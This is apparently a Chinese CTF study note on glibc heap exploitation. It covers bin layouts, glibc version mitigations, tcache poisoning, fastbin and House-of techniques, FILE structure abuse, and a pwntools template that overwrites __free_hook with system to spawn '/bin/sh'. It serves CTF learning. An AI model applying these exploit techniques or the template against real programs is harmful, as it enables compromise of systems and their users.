# 堆利用

## 题型识别

- 菜单 + add/free/edit/show
- `malloc` `free` `calloc` `realloc` 在反编译里
- 题目分类涉及 `glibc 2.27` `2.31` `2.35` 等

## 关键概念

| 块大小 | bin |
|---|---|
| 16-1008B (`size_t` * 2 ~ size_t * 126) | fast / tcache |
| 1024B-128KB | small / large |
| > 128KB | mmap |

```
tcache:    每 size 单链，FIFO，glibc 2.26+
fastbin:   <=0x80 单链 LIFO
smallbin:  双链 LIFO
unsortedbin: 临时存放，FIFO
largebin:  排序双链
```

## glibc 版本差异

- 2.26：tcache 引入
- 2.27：tcache 是默认（key 字段未保护）
- 2.29：tcache count + tcache double-free 检测
- 2.31：tcache key 保护增强
- 2.32：safe-linking（fastbin/tcache 指针异或）
- 2.34：libpthread 合并到 libc

利用难度随版本升高。先 `strings libc.so.6 | grep GLIBC_` 确认版本。

## 经典漏洞模式

| 模式 | 利用 |
|---|---|
| UAF (Use After Free) | tcache poisoning / fastbin attack |
| Double Free | 同上 |
| Heap Overflow | 改下个 chunk size / fd / bk |
| Off-by-one | poison-null-byte |
| Edit after free | 改 fd 控分配 |

## tcache poisoning

```
1. free 块 A → 进 tcache
2. UAF 改 A->next 为目标地址（如 __free_hook 的地址）
3. malloc 两次：第二次返回目标地址
4. 写入数据
```

2.32+ 需要 safe-linking：`fd ^= (heap_addr >> 12)`，要泄露 heap 地址。

## fastbin attack

```
1. 构造 fake chunk（size 字段合法）
2. 把 fake chunk 链入 fastbin
3. malloc 拿到 fake chunk 任意写
```

## House of XXX 系列

- House of Force（large alloc 攻击 top chunk size）→ 2.29+ 已修
- House of Spirit（free 栈地址 → 重 malloc 拿到栈）
- House of Einherjar（UAF 触发 unlink）
- House of Orange（FILE 结构利用）
- House of Apple / House of Husk → 2.31+ FILE/printf 利用

## FILE 结构利用

`_IO_FILE` 结构里的虚函数表（_IO_jump_t）可控时 → 任意函数调用。

CTF 常套路：泄露 stderr → 改 `_IO_2_1_stderr_->_IO_jump_table` 指向可控位置。

## 模板：tcache poisoning + __free_hook

```python
from pwn import *
p = process('./bin')

def add(size, data): ...
def free(idx): ...
def edit(idx, data): ...

# 1. 泄露 libc：让一个块进 unsorted bin（malloc 大于 0x90 后 free）
add(0x430)
add(0x10)   # 防 top chunk 合并
free(0)
# show 拿 fd = main_arena 地址
leak = u64(show(0).ljust(8,b'\x00'))
libc.address = leak - LIBC_MAIN_ARENA_OFFSET

# 2. tcache poisoning
add(0x80) # idx2
add(0x80) # idx3
free(2)
free(3)
edit(3, p64(libc.sym['__free_hook']))
add(0x80)               # idx 4：占回 3
add(0x80)               # idx 5：拿到 __free_hook
edit(5, p64(libc.sym['system']))

# 3. 触发
add(0x10, b'/bin/sh\x00')   # idx 6
free(6)                      # 触发 system('/bin/sh')

p.interactive()
```

## 推荐工具

```bash
pwndbg                    # 比 gdb-peda 更适合堆题
> heap                    # 看堆
> bins                    # 看 bin
> arena
> vis                     # 可视化
```

## 多步调试

```bash
gdb attach 一边运行一边 step
# 关键点：
# - free 后 bin 是否符合预期
# - malloc 返回是否目标地址
# - 写入是否成功
```
